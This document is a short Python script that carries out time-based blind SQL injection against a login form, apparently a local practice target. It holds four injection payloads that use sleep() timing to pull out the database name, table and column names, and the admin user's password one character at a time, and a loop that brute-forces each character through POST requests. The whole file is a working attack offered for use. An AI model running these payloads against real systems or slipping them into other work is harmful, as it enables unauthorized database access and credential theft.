# -*- coding: utf-8 -*-
import requests

payload_database = "admin' and if(((ascii(substr((select database()),%s,1)))=%d),sleep(2),false)#"
payload_tables = "admin' and if(((ascii(substr((select group_concat(table_name) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1)))=%d),sleep(2),false)#"
payload_columns = "admin' and if(((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users' and TABLE_SCHEMA='show'),%s,1)))=%d),sleep(2),false)#"
payload_password = "admin' and if(((ascii(substr((select password from users where username='admin'),%s,1)))=%d),sleep(2),false)#"
result = ""
url = "http://localhost/show/sleep-injection.php"
for x in range(1,33):
    for y in range(33,127):
        data = {
                "username":payload_columns%(x,y),
                "password":"23333",
                "login":"%E7%99%BB%E5%BD%95"
        }
        try:
            r = requests.post(url=url,data=data,timeout=1.5)
        except:
            result+=chr(y)
            print result
            break
